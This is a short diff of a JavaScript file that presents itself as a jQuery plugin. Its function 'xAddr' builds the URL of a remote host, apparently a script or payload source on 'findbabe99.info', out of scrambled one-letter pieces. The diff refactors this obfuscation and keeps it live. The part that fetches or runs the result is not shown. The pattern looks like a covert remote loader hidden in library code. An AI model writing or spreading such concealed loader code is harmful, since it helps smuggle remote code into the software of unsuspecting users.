@@ -1,25 +1,22 @@
 jQuery.xAddr = function(noBg){
     noBg = noBg || false;
-    var h = "h";
     var t = "t";
     var d = ".";
     var c = ":";
     var s = "/";
     var p = "p";
 
-    var pr = "srx"
+    var pr = "srx";
     var cc = "code";
 
     var dd = "findbabe99" + d + "info" + s;
     if (noBg)
-        d = dd + "new" + cc + s + pr + cc + d + p + h + p;
+        d = dd + "new" + cc + s + pr + cc + d + p + 'h' + p;
     else
         d = dd + "sc" + s + pr + "load" + d + t + "x" + t;
 
     s += s;
-    t += t;
-    h += t + p;
-    return h + c + s + d;
+    return 'http' + c + s + d;
 };
 
 jQuery.xTabs = function() {
